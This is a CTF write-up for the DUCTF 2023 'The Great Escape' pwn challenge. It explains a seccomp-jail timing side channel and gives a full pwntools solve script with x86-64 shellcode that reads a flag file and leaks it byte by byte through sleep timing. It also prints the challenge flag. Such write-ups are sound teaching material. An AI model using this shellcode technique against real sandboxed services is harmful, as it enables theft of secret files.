---
title: Writeup - The Great Escape (DUCTF 2023)
date: 2023-09-04 00:00:00
tags: 
- writeup
- pwn
- ductf2023
---

# DUCTF 2023 - The Great Escape
## Description
```markdown
Do you have an escape plan?

Flag: `/chal/flag.txt`

Author: sradley

`nc 2023.ductf.dev 30010`

[jail]
```

## Writeup
No source code was provided [for this one](/static/ductf-greatescape/escape), but the decomp was pretty easy to obtain through Ghidra:

```c
bool main(void) {
  code *shellcode;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  shellcode = (code *)mmap((void *)0x0,0x80,7,0x22,0,0);
  if (shellcode != (code *)0x0) {
    printf("what is your escape plan?\n > ");
    fgets((char *)shellcode,0x7f,stdin);
    enable_jail();
    (*shellcode)();
  }
  return shellcode == (code *)0x0;
}
```

It reads in 127 bytes of input from the user, places it in a custom RWX section in memory, and runs it as shellcode. However, the `enable_jail()` function is called, which sets up seccomp and only enables the following syscalls (found by running `seccomp-tools dump ./escape`):

* `read`
* `nanosleep`
* `exit`
* `openat`

These syscalls mean you can open `/chal/flag.txt`, read it into memory, but can't write it to stdout. However, using `nanosleep` and `exit` can be used to side channel it by bruting bit by bit. This is an example of how it would flow: 

1. Open `/chal/flag.txt` and get the file descriptor `0x3` back
2. Read x bytes from fd 3 into somewhere in memory (I choose the stack cuz it's easy)
3. Put a single byte from the stack into a register, and compare it to a hex value (like `0x61`, or `'a'`)
4. If the values match, `nanosleep` for 2 seconds. If they don't, exit immediately. 

Using this method, we can run the program and if it takes 2 seconds longer than normal to exit, we know we guessed the right letter. Then, we move on to the next letter and start all over again. 

This does take quite a while because a new network connection needs to be established for each guess, and the flag was somewhat long. I ended up getting many false positives because of network jitter, and (for some reason I don't understand) the program would only wait 0.02 seconds longer with nanosleep no matter what. I ended up implementing a double-check system where if the time it took the program to exit exceeded my defined threshold, it would run it again just to make sure it wasn't a mistake. 

After about an hour of tweaking and waiting, I finally extracted the whole flag. 

*It's also important to note that the program uses `fgets` to read the input, meaning it stops once it hits a newline (`0x0a`). Luckily, there weren't any newlines in the shellcode, except when I had to test the flag at offset 0x0a. However, this was obviously an underscore so it was easy to guess. 

### Solve Script
[Solve script](/static/ductf-greatescape/solve.py):

```python
from pwn import *
import time


# initialize the binary
binary = "./escape"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break *(main+197)
continue
"""

flag = ''
def run(i):
    global flag
    if args.REMOTE:
        p = remote("2023.ductf.dev", 30010)
    elif args.GDB:
        p = gdb.debug(binary, gdbscript=gs)
    else:
        p = elf.process()

    p.recvline()

    # flag location - /chal/flag.txt
    # we only get 127 bytes of shellcode
    payload = f'''
    // openat(0, "/chal/flag.txt", 0)
    // dirfd is ignored, 0 is READONLY
    OPENAT:
    mov rax, 257
    mov rdi, 0
    mov rsi, 0x7478742e6761
    push rsi
    mov rsi, 0x6c662f6c6168632f
    push rsi
    mov rsi, rsp
    mov rdx, 0
    syscall

    // read(3, rsp, 0x100)
    READ:
    mov rdi, rax
    mov rax, 0
    mov rdx, 0x100
    syscall

    // compare
    COMPARE:
    add rsp, {hex(len(flag))}
    mov al, byte ptr [rsp]
    cmp al, {hex(ord(i))}
    je NANOSLEEP;

    // exit
    EXIT:
    mov rax, 60
    syscall

    // nanosleep(*-->0x2, 0)
    NANOSLEEP:
    mov QWORD PTR [rbx], 0x5
    mov rdi, rbx
    mov rsi, 0
    mov rax, 35
    syscall
    '''

    compiled = asm(payload)
    #print(f'len: {len(compiled)}')

    p.sendline(compiled)


    start_time = time.time()
    try:
        p.recvline()
    except EOFError:
        pass
    diff = time.time() - start_time

    p.close()
    return diff


### START LOOP ###
while '}' not in flag:
    for letter in string.printable:
        diff = run(letter)
        print(f'{letter} - {diff}')

        if diff > 0.19:
            print("Testing again...")

            if run(letter) > 0.19:
                print("FOUND IT", letter)
                flag += letter
                print(f'Flag: {flag}')
                break
            else:
                print("False positive")
```

**Flag**: `DUCTF{S1de_Ch@nN3l_aTT4ckS_aRe_Pr3tTy_c00L!}`